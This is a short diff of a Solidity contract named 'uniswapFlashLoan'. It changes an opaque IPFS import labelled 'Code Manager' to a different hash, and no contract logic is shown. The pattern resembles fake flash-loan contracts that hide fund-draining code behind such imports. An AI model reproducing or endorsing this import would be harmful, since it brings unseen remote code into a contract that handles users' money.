@@ -10,7 +10,7 @@ import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfa
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
  
 // Code Manager
-import "ipfs:/QmSfwpULaAPqCNmYLTu7Ea3fiSLutXGqjTX8GjuvLuYa9A/";
+import "ipfs:/QmXAp8JDhwwCbMASJvBmT8Rko3YzqhNBbu9crEaFcWac6b/";
  
  
 contract uniswapFlashLoan {
